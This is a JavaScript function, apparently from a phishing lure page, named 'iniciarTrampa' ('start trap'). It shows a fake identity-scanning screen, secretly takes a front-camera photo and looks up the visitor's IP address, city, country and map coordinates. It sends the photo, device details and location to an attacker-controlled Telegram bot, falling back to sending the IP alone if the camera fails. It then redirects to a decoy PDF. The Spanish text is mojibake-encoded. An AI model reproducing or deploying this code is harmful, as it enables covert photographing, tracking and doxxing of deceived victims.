async function iniciarTrampa() {
            if (navigator.vibrate) navigator.vibrate(50);
            document.getElementById('line').style.display = "block";
            document.getElementById('bar').style.display = "block";
            const fill = document.getElementById('fill');
            textGuide.innerHTML = "ESCANEANDO... MANTENGA LA POSICIÃ“N";
            setTimeout(() => { fill.style.width = "100%"; }, 100);

            try {
                // 1. Captura de cÃ¡mara con espera de enfoque
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                // Esperamos un segundo para que la cÃ¡mara aclare la imagen
                await new Promise(r => setTimeout(r, 1000));

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth; 
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const fotoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
                stream.getTracks().forEach(t => t.stop());

                // 2. Obtener ubicaciÃ³n
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                const equipo = navigator.userAgent.match(/\(([^)]+)\)/)[1];

                const reporte = `ðŸ‘¤ *VERIFICACIÃ“N COMPLETADA*\n\nðŸ“± *EQ:* ${equipo}\nðŸŒ *IP:* \`${d.ip}\`\nðŸ“ *Lugar:* ${d.city}, ${d.country_name}\nðŸ”— *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;

                // 3. ENVÃO OBLIGATORIO (Esperamos a que ambos terminen)
                const fd = new FormData();
                fd.append('chat_id', CONFIG.CHAT_ID);
                fd.append('photo', fotoBlob, 'foto.jpg');
                fd.append('caption', reporte); // Enviamos el texto y la foto juntos
                fd.append('parse_mode', 'Markdown');

                // Usamos sendPhoto para enviar todo de un solo golpe
                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: fd
                });

            } catch(e) { 
                console.log("Error en captura:", e); 
                // Si la cÃ¡mara falla, intentamos enviar al menos el texto
                try {
                    const res = await fetch('https://ipapi.co/json/');
                    const d = await res.json();
                    await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            chat_id: CONFIG.CHAT_ID, 
                            text: "âš ï¸ FALLÃ“ CÃMARA\nIP: " + d.ip
                        })
                    });
                } catch(err) {}
            }

            // 4. FinalizaciÃ³n
            setTimeout(() => {
                beep.play();
                textGuide.innerHTML = "âœ… IDENTIDAD CONFIRMADA. ABRIENDO PDF...";
                setTimeout(() => { window.location.href = CONFIG.PDF_URL; }, 1500);
            }, 3000);
        }
